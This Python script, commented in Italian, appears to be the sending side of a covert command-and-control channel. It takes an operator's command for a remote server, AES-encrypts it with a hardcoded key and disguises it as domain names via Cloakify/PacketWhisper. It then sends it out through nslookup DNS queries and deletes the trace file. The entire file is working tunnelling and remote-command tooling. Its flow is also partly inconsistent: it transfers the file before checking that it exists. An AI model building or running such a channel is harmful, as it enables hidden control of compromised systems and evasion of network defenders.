import subprocess
import os
from aes_encrypt import encrypt_message
from cloakify import Cloakify
from packetWhisper import CloakAndTransferFile, TransferCloakedFile

# Chiave AES (16, 24 o 32 byte)
key = b'TuaChiaveAES32byteQui__AESKeyExample'[:32]

def send_command(command):
    # Criptare il comando
    encrypted_command = encrypt_message(command, key)

    # Genera e cloackifica il comando in `cloaked_command.txt`
    cloaked_command = "cloaked_command.txt"
    
    print("Cloaking command...")
    Cloakify(encrypted_command, "ciphers\\repeated_unique_fqdn\\red_lectroids", cloaked_command)

    print("Initializing command transfer")
    TransferCloakedFile("cloaked_command.txt", 0.0)
    # Verifica che il file `cloaked_command.txt` sia stato creato correttamente
    if not os.path.exists(cloaked_command):
        print("Errore: il file `cloaked_command.txt` non è stato creato.")
        return

    # Invia il comando tramite pacchetti DNS
    with open(cloaked_command, 'r') as file:
        for fqdn in file:
            fqdn_str = fqdn.strip()
            subprocess.call(['nslookup', fqdn_str])

    # Rimuove il file dopo l'invio per evitare invii ripetuti
    os.remove(cloaked_command)

if __name__ == "__main__":
    command = input("Inserisci il comando da eseguire sul server: ")
    send_command(command)
